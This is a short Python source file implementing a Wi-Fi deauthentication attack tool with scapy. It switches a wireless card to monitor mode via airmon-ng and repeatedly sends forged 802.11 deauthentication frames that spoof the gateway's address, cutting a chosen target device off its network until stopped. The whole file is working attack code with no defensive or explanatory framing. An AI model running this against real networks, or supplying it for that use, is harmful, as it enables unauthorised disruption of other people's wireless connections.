import os
from threading import *
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf


class Deauth():
    def __init__(self):
        self.stop_event = Event()

    def start_deauth(self, iface, target_mac, gateway_mac, channel):
        self.iface = iface
        self.iface_monitor = iface + "mon"
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.channel = channel

        self.set_iface_monitor()
        thread_run_deauth = Thread(target=self.run_deauth)
        thread_run_deauth.setDaemon(True)
        thread_run_deauth.start()

    def run_deauth(self):
        packet = RadioTap()/Dot11(addr1=self.target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac)/Dot11Deauth(reason=7)
        while not self.stop_event.is_set():
            try:
                sendp(packet, iface=self.iface_monitor, verbose=False)
            except KeyboardInterrupt:
                self.stop_deauth()

    def stop_deauth(self):
        self.stop_event.set()
        self.set_iface_managed()

    def set_iface_monitor(self):
        # cmd_1 = f"sudo ifconfig {self.iface} down"
        # cmd_2 = f"sudo iwconfig {self.iface} mode monitor"
        # cmd_3 = f"sudo ifconfig {self.iface} up"
        # cmd_4 = f"sudo systemctl stop NetworkManager"
        cmd_1 = f"sudo airmon-ng start {self.iface}"
        cmd_2 = f"sudo iwconfig {self.iface_monitor} channel {self.channel}"
        os.system(cmd_1)
        os.system(cmd_2)

    def set_iface_managed(self):
        # cmd_1 = f"sudo ifconfig {self.iface} down"
        # cmd_2 = f"sudo iwconfig {self.iface} mode managed"
        # cmd_3 = f"sudo ifconfig {self.iface} up"
        # cmd_4 = f"sudo systemctl restart NetworkManager"
        cmd_1 = f"sudo airmon-ng stop {self.iface_monitor}"
        os.system(cmd_1)
